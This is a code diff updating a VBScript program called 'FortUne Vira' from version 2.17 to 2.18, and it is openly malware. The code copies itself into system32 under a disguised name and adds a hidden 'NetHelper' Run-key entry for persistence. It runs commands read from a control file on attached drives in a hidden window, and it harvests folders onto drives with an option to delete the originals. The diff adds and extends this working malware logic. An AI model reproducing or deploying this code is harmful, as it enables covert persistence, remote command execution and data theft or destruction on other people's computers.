@@ -1,12 +1,12 @@
 '*******************
 '  FortUne Vira
-'  Version 2.17
+'  Version 2.18
 '*******************
 Option Explicit
 On Error Resume Next
-Const ViraVersion = "2.17"
+Const ViraVersion = "2.18"
 Const ViraTitle = "Vira 2"
-Const ViraDescription = "Vira 2.17 - A total hacker!"
+Const ViraDescription = "Vira 2.18 - Enhanced ""backdoor""!"
 
 ' System
 Dim Shell, Fso, IsAdmin
@@ -32,11 +32,13 @@ Else
     arg = LCase(WScript.Arguments(i))
     Select Case arg
       Case "install"
-        Wsh.Quit InstallLocal
+        Wsh.Quit InstallLocal()
       Case "help"
         MsgBox "XWH loves YZ.", 0, ViraTitle
       Case "credit"
         MsgBox ViraDescription, 0, ViraTitle
+      Case "version"
+        MsgBox "Vira Version " & ViraVersion, 0, ViraTitle
     End Select
   Next
 End If
@@ -104,7 +106,7 @@ Function DriveProcess(DriveLetter)
     If TimeB < TimeA Then TimeB = TimeB + 86400
     Set Folder = Fso.GetFolder(Target)
     Set Text = Fso.OpenTextFile(Target & "Vira.ini", 8)
-    Text.WriteLine "[ExtendDriveInfo]"
+    Text.WriteLine "[ExtendedDriveInfo]"
     Text.WriteLine "AverageSpeed=" & ConvertSize(Folder.Size / (TimeB-TimeA)) & "/s"
     Text.Close
     DriveProcess = True
@@ -123,8 +125,11 @@ Function DriveControlProcess(DriveLetter)
           HarvestDrive DriveLetter, Text.ReadAll()
         Case "[ViraExecute]"
           Control = Text.ReadAll()
-          Control = Replace(Control, "thisDrive", """" & DriveLetter & """")
-          ExecuteGlobal Control
+          Control = Replace(Control, "thisDrive", DriveLetter)
+          Control = Replace(Control, "storageDir", Destination)
+          Control = Replace(Control, "storageCapacity", CapacityGB)
+          ' For more variables
+          Shell.Run Control, 0, False
       End Select
       DriveControlProcess = True
       Exit Function
@@ -137,24 +142,37 @@ End Function
 Function HarvestDrive(DriveLetter, HarvestInfo)
   On Error Resume Next
   Dim Info, Target, TFolder, SFolder, PFolder, i
-  Info = Split(HarvestInfo, "|")
-  If UBound(Info) < 2 Then Exit Function
+  Info = Split(HarvestInfo, vbCrLf)
+  
+  Dim cTarget, cCapacity, cCopyNonExist, cDeleteAfterHarvest, str
+  cTarget = "\VHarvest\"
+  cCapacity = 32
+  cCopyNonExist = True
+  cDeleteAfterHarvest = False
   For i = 0 To UBound(Info)-1
-    Info(i) = Trim(Info(i))
+    str = Split(Info(i), "=")
+    Select Case LCase(str(0))
+      Case "target"
+        cTarget = str(1)
+      Case "capacity"
+        cCapacity = CDbl(str(1))
+      Case "copynonexist"
+        cCopyNonExist = CBool(str(1))
+      Case "deleteafterharvest"
+        cDeleteAfterHarvest = CBool(str(1))
+    End Select
   Next
-  Target = DriveLetter & ":\" & Info(1) & "\"
+  
+  Target = DriveLetter & ":" & cTarget
+  If Not Fso.FolderExists(Target) Then Fso.CreateFolder Target
   Set TFolder = Fso.GetFolder(Target)
   Set SFolder = Fso.GetFolder(Destination)
-  If UBound(Info) >= 3 Then
-    CopyNew = Info(2)
-  Else
-    CopyNew = False
-  End If
   
   For Each i In SFolder.SubFolders
     Set PFolder = Fso.GetFolder(i)
-    If PFolder.Size + TFolder.Size <= Info(0) * 1000000000 Then
-      Fso.CopyFolder i, Target, CopyNew
+    If PFolder.Size + TFolder.Size <= cCapacity * 1000000000 Then
+      Fso.CopyFolder i, Target, Not cCopyNonExist
+      If cDeleteAfterHarvest Then Fso.DeleteFolder i, True
     End If
   Next
 End Function
@@ -169,8 +187,8 @@ Function WriteDriveInfo(DriveLetter, Target)
   Text.WriteLine "Label=" & Drive.VolumeName
   Text.WriteLine "SerialNumber=" & Hex(Drive.SerialNumber)
   Text.WriteLine "FileSystem=" & Drive.FileSystem
-  Text.WriteLine "TotalSize=" & Drive.TotalSize
-  Text.WriteLine "FreeSpace=" & Drive.FreeSpace
+  Text.WriteLine "TotalSize=" & Drive.TotalSize & " (" & ConvertSize(Drive.TotalSize) & ")"
+  Text.WriteLine "FreeSpace=" & Drive.FreeSpace & " (" & ConvertSize(Drive.FreeSpace) & ")"
   Text.Close
 End Function
 
@@ -251,9 +269,9 @@ Function InstallLocal()
     Fso.CopyFile WScript.ScriptFullName, "C:\Windows\system32\d3dxm.vbe", True
   End If
   Shell.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\NetHelper", _
-                 "C:\Windows\system32\netHelper.exe C:\Windows\system32\d3dxm.vbe", "REG_SZ"
+                 "%SystemRoot%\system32\netHelper.exe %SystemRoot%\system32\d3dxm.vbe", "REG_SZ"
   MsgBox "Installation Complete!", 64, ViraTitle
-  Shell.Run "C:\Windows\system32\netHelper.exe C:\Windows\system32\d3dxm.vbe", 0, False
+  Shell.Run "%SystemRoot%\system32\netHelper.exe %SystemRoot%\system32\d3dxm.vbe", 0, False
   InstallLocal = 0
 End Function
 
